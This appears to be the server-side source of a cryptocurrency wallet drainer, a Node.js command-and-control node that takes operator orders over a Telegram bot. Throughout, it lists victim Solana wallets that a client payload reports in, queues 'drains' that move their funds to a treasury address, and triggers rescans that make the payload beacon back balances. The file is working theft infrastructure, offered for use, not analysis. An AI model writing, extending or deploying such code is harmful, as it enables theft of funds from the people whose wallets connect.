'use strict';
const http = require("http"), fs = require("fs"), path = require("path");
const { BOT_TOKEN: BOT, CHAT_ID: CHAT, TREASURY, BEACON_KEY, PORT = 8787 } = process.env;

if (!BOT || !CHAT || !TREASURY) {
  console.error("missing BOT_TOKEN / CHAT_ID / TREASURY in env");
  process.exit(1);
}

process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));

const VERSION = "v3.2";
const COMMIT = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
const BOOT_TS = Date.now();

let tgOffset = null;   // null = first boot after restart — fast-forward past backlog
const targets = {}, cmds = {};

const { execSync } = require("child_process");
const ROOT = path.join(__dirname, "..");
const MIN = path.join(ROOT, "client", "x.min.js");
if (!fs.existsSync(MIN)) {
  console.log("building client/x.min.js at startup...");
  execSync("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT });
}

const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

function tg(text, pre) {
  return fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT, text: (pre || "") + text, parse_mode: "HTML", disable_web_page_preview: true })
  }).catch(() => {});
}

function uptimeStr() {
  const s = Math.floor((Date.now() - BOOT_TS) / 1000);
  const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600), m = Math.floor((s % 3600) / 60);
  return (d ? d + "d " : "") + (h ? h + "h " : "") + m + "m";
}

function listTargets() {
  return Object.entries(targets).map(function (kv, i) {
    const k = kv[0], r = kv[1];
    return "#" + (i + 1) + " " + k + "\n   $" + (r.value ?? 0).toLocaleString() + " \u00b7 " + (r.provider || "?") + " \u00b7 " + (r.origin || "?") +
      (r.drained ? " \u00b7 drained" : "") + (cmds[k] ? " \u00b7 drain queued" : "");
  }).join("\n");
}

function queueDrain(pk, to) {
  cmds[pk] = { to: to, n: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), ts: Date.now() };
}

function handleCommand(m) {
  const raw = (m.text || "").trim();
  const parts = raw.split(/\s+/);
  const cmdRaw = parts[0] || "";
  const cmd = cmdRaw.split("@")[0].toLowerCase();   // strips @botname suffix
  const rest = parts.slice(1);

  if (cmd === "/start") {
    tg("\ud83e\udd16 <b>Pump Patroller \u2014 control node</b>\n" +
      "build: <b>" + VERSION + "</b>\n" +
      "commit: <code>" + COMMIT + "</code>\n" +
      "up: " + uptimeStr() + "\n" +
      "beacon key: " + (BEACON_KEY ? "\u2705 set" : "\u274c missing") + "\n" +
      "treasury: <code>" + TREASURY.slice(0, 4) + "\u2026" + TREASURY.slice(-4) + "</code>\n\n" +
      "/targets \u2014 list detected wallets\n" +
      "/drains \u2014 drain ALL \u2192 treasury\n" +
      "/drains <#|addr> [dest] \u2014 drain one\n" +
      "/stop \u2014 cancel queued drain\n" +
      "/clear \u2014 forget all targets\n" +
      "/clear <#|addr> \u2014 forget one\n" +
      "/detect \u2014 rescan + re-report (sends rescan to all live wallets)");
    return;
  }

  if (cmd === "/help") {
    tg("Patroller commands\n/targets \u2014 list wallets\n/drains \u2014 drain ALL \u2192 treasury\n/drains <#|addr> [dest] \u2014 drain one\n/stop \u2014 cancel queued\n/clear \u2014 forget all targets\n/clear <#|addr> \u2014 forget one\n/start \u2014 version banner");
    return;
  }

  if (cmd === "/targets") {
    tg(listTargets() || "none \u2014 waiting for a wallet", "targets:\n");
    return;
  }

  if (cmd === "/drains") {
    const list = Object.keys(targets);
    if (!list.length) return tg("no targets yet \u2014 waiting for a wallet to connect");
    let picked, to;
    const arg = rest[0] || "";
    if (arg === "" || arg.toLowerCase() === "all") { picked = list.slice(); to = rest[1] || TREASURY; }
    else if (/^\d{1,3}$/.test(arg) && list.length) {
      const i = (parseInt(arg, 10) - 1) % list.length;
      picked = [list[i]]; to = rest[1] || TREASURY;
    }
    else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
    else { picked = [list[list.length - 1]]; to = arg || TREASURY; }
    if (!B58RE.test(to)) return tg("that doesn't look like a pubkey: " + String(to).slice(0, 24));
    const lines = [];
    for (const pk of picked) {
      queueDrain(pk, to);
      lines.push("\u2022 " + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + " \u2192 " + to.slice(0, 4) + "\u2026" + to.slice(-4));
    }
    tg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
    return;
  }

  if (cmd === "/stop") {
    const list = Object.keys(targets);
    const arg = rest[0] || "";
    const key = (/^\d{1,3}$/.test(arg) && list.length) ? list[(parseInt(arg, 10) - 1) % list.length]
      : (B58RE.test(arg) ? arg : (list.length ? list[list.length - 1] : null));
    if (!key || !cmds[key]) return tg("no queued drain for that target");
    delete cmds[key];
    tg("cancelled queued drain for " + key.slice(0, 4) + "\u2026" + key.slice(-4));
    return;
  }

  if (cmd === "/clear") {
    const list = Object.keys(targets);
    const arg = rest[0] || "";
    if (B58RE.test(arg) && targets[arg]) {
      delete targets[arg]; delete cmds[arg];
      return tg("forgot " + arg.slice(0, 4) + "\u2026" + arg.slice(-4));
    }
    if (/^\d{1,3}$/.test(arg) && list.length) {
      const k2 = list[(parseInt(arg, 10) - 1) % list.length];
      delete targets[k2]; delete cmds[k2];
      return tg("forgot " + k2.slice(0, 4) + "\u2026" + k2.slice(-4));
    }
    const n = list.length;
    for (const k of Object.keys(targets)) delete targets[k];
    for (const k of Object.keys(cmds)) delete cmds[k];
    tg(n ? "cleared " + n + " targets" : "nothing to clear");
    return;
  }

  if (cmd === "/rescan") {
    // queue a "rescan" for every live (non-drained) target — payload picks it up
    // via /cmd and re-runs detection + balance read, beacons back a fresh report
    const list = Object.keys(targets);
    let n = 0;
    for (const k of list) {
      if (!targets[k].drained) {
        cmds[k] = { to: null, n: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), ts: Date.now(), rescan: true };
        n++;
      }
    }
    tg(n ? "rescan queued \u00d7" + n : "no live targets to rescan");
    return;
  }
}

async function pollTg() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0")).json();
    for (const u of (j && j.result) || []) {
      if (u.update_id <= tgOffset) continue;
      tgOffset = u.update_id;
      try { fs.writeFileSync(__dirname + "/.offset", String(tgOffset)); } catch (e) {}
      const m = u.message;
      if (m && m.text && m.text.charAt(0) === "/") handleCommand(m);
    }
  } catch (e) { console.error("pollTg:", e && (e.message || e)); }
}

// boot fast-forward — skip Telegram backlog so stale commands never replay
(async function boot() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0")).json();
    const r = (j && j.result) || [];
    if (r.length) tgOffset = r[r.length - 1].update_id;
    else tgOffset = 0;
    try { fs.writeFileSync(__dirname + "/.offset", String(tgOffset)); } catch (e) {}
  } catch (e) { tgOffset = 0; }
  tg("\ud83d\ude80 <b>patroller booted</b> \u2014 build <b>" + VERSION + "</b> \u00b7 commit <code>" + COMMIT + "</code>\nbacklog skipped \u2014 /start for commands", "\ud83d\udce1 ");
  setInterval(pollTg, 3000);
})();